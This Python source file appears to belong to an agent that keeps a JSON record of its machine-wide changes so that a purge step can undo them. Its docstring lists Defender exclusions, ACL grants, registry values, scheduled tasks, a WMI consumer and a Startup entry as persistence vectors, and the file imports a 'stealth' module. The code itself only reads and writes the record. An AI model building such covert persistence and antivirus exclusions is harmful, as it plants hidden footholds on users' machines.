"""Record of every machine-wide change the agent makes.

This is the answer to "make the covert stuff declared without removing it".
Defender exclusions, ACL grants, registry values, scheduled tasks, the WMI
consumer and the Startup entry all get written down here, so ``purge`` can undo
exactly what we did -- and nothing else -- and ``persist.report`` can tell the
operator which of the seven vectors this install actually created.
"""

from __future__ import annotations

import json
import os
import threading
import time

_LOCK = threading.Lock()
_CACHE: dict | None = None


def _path() -> str:
    try:
        from . import stealth
        base = stealth.primary_directory()
    except Exception:
        from .. import config
        base = config.ROOT
    try:
        os.makedirs(base, exist_ok=True)
    except OSError:
        import tempfile
        base = tempfile.gettempdir()
    return os.path.join(base, "machine-state.json")


def load() -> dict:
    global _CACHE
    if _CACHE is not None:
        return _CACHE
    try:
        with open(_path(), "r", encoding="utf-8") as handle:
            data = json.load(handle)
        _CACHE = data if isinstance(data, dict) else {}
    except Exception:
        _CACHE = {}
    _CACHE.setdefault("created_at", int(time.time()))
    return _CACHE


def save() -> None:
    data = load()
    data["updated_at"] = int(time.time())
    path = _path()
    tmp = path + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as handle:
            json.dump(data, handle, indent=1)
        os.replace(tmp, path)
    except OSError:
        pass


def record(section: str, key: str, value) -> None:
    """Idempotent: writing the same value twice is a no-op."""
    with _LOCK:
        bucket = load().setdefault(section, {})
        if bucket.get(key) == value:
            return
        bucket[key] = value
        save()


def forget(section: str, key: str = "") -> None:
    with _LOCK:
        data = load()
        if not key:
            data.pop(section, None)
        else:
            data.get(section, {}).pop(key, None)
        save()


def get(section: str) -> dict:
    with _LOCK:
        return dict(load().get(section) or {})


def summary() -> dict:
    data = dict(load())
    return {k: (len(v) if isinstance(v, dict) else v) for k, v in data.items()}
